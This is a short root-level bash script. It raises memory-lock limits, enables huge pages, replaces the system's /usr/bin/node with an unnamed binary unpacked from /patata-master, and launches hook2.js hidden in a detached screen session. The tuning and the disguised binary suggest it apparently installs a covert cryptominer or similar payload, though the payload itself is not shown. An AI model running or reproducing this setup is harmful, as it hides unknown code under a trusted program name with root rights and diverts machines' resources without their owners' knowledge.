#!/bin/bash
if [ ! -f /etc/proof2 ]; then
    sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
    sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
    sudo touch /etc/proof2
fi
#sudo apt-get remove --purge node
sudo xz -d /patata-master/node.xz
sudo chmod +x /patata-master/node
sudo mv /patata-master/node /home
sudo ln -sf /home/node /usr/bin/node
sudo chmod +x /patata-master/patata2
sudo sysctl -w vm.nr_hugepages=128
screen -dm sudo NODE_ENV=production node /patata-master/hook2.js "$1" "$2"
